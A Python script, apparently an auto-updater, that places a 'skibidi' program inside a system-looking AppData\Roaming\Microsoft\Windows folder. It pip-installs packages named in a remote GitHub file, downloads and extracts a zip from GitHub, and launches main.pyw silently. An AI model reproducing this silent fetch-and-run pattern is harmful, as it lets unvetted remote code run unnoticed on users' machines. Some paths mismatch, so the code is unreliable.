import requests
import zipfile
import os
import shutil
import subprocess
import sys

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

sys.stdout = open(os.path.join(target_path, "skibidi-startup", "log.txt"), "w")
sys.stderr = sys.stdout

user_profile = os.environ['USERPROFILE']
def install_packages(package_string):
    packages = package_string.split()
    for package in packages:
        subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/new_packages.txt")
p1 = r.text
if not p1 == "":
    install_packages(p1)

with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain', 'ver.txt'), 'r') as ver:
    r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ver.txt")
    ver1 = r.text
    ver2 = ver.read()
    ver.close()
if ver2 == ver1:
    pass
else:
    shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain'))
    target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
    r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
    open(file_path, 'wb').write(r.content)
    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        zip_ref.extractall(target_path)
    with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as upd:
        upd.write(str(ver1))
        upd.close()
    os.remove(file_path)
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
subprocess.Popen(['pythonw', os.path.join(target_path, "skibidi-mainmain", "main.pyw")])